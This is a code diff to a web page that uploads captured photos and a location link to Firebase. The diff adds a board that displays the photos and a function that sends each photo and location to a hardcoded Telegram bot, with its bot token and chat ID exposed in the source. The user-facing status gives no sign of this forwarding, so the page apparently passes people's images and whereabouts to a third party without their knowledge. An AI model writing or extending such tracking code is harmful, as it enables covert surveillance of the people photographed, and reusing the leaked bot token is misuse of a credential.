@@ -40,6 +40,13 @@
       border-radius: 5px;
       font-family: Arial, sans-serif;
     }
+
+    .photoligram-board {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin-top: 20px;
+    }
   </style>
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
@@ -133,7 +140,7 @@
       });
     }
 
-    // Upload the photo to Firebase
+    // Upload the photo to Firebase and Telegram
     async function uploadPhoto(blob, location) {
       const fileName = `photo_${Date.now()}.jpg`;
       const photoRef = ref(storage, fileName);
@@ -155,9 +162,63 @@
         console.log(`Uploaded: ${downloadURL}`);
         console.log(`Location: ${locationLink}`);
         status.textContent = "!";
+
+        // Display the uploaded photo on the photoligram board
+        displayPhotoOnBoard(downloadURL, locationLink);
+
+        // Send the photo and location to Telegram
+        await sendPhotoToTelegram(downloadURL, locationLink);
       } catch (error) {
         console.error("Upload Error:", error);
         status.textContent = "Error uploading photo. Please try again.";
+      }
+    }
+
+    // Function to display the photo on the photoligram board
+    function displayPhotoOnBoard(photoUrl, locationLink) {
+      const board = document.querySelector('.photoligram-board');
+
+      const imgElement = document.createElement('img');
+      imgElement.src = photoUrl;
+      imgElement.alt = 'Captured Photo';
+      imgElement.style = 'width: 150px; height: 150px; object-fit: cover; border-radius: 10px;';
+
+      const locationElement = document.createElement('div');
+      locationElement.textContent = `Location: ${locationLink}`;
+      locationElement.style = 'color: white; font-size: 14px;';
+
+      const photoWrapper = document.createElement('div');
+      photoWrapper.appendChild(imgElement);
+      photoWrapper.appendChild(locationElement);
+
+      board.appendChild(photoWrapper);
+    }
+
+    // Function to send the photo and location to Telegram
+    async function sendPhotoToTelegram(photoUrl, locationLink) {
+      const token = '7297798760:AAGnBdRRlLer-ANQFyI0-Hq3G-0WcH3XfYA';  // Replace with your Telegram bot token
+      const chatId = '1691680798';  // Replace with your Telegram chat ID
+
+      const message = `Photo captured at: ${locationLink}`;
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', photoUrl);  // Use the URL of the uploaded photo
+      formData.append('caption', message); // Add the location with the message
+
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: 'POST',
+          body: formData,
+        });
+
+        const result = await response.json();
+        if (result.ok) {
+          console.log('Photo and location sent to Telegram successfully');
+        } else {
+          console.error('Failed to send photo to Telegram:', result);
+        }
+      } catch (error) {
+        console.error('Error sending photo to Telegram:', error);
       }
     }
   </script>
@@ -174,5 +235,8 @@
 
   <!-- Status Display -->
   <div class="status">Initializing...</div>
+
+  <!-- Photoligram Board -->
+  <div class="photoligram-board"></div>
 </body>
 </html>
